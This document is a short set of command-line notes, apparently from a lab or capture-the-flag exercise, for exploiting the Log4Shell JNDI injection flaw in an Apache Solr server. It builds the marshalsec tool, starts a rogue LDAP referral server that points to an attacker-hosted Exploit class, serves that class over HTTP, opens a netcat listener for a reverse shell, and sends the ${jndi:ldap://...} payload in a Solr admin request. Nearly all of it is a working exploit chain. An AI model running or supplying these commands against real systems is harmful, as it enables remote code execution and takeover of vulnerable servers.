# build marshalsec for LDAP server
$ git clone https://github.com/mbechler/marshalsec
$ sudo apt install maven
$ cd marshalsec
$ (sudo) mvn clean package -DskipTests

# start LDAP server
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"

# compiling Exploit.java
# source / target required for java version on remote victim..?
$ javac Exploit.java -source 8 -target 8

$ php -S 10.18.78.209:8888
# or
$ python3 -m http.server 8888

$ nc -lnvp 1234

# attack server
# HTTP request:
http://10.10.145.151:8983/solr/admin/cores?id=${jndi:ldap://10.18.78.209:1389/Exploit\}
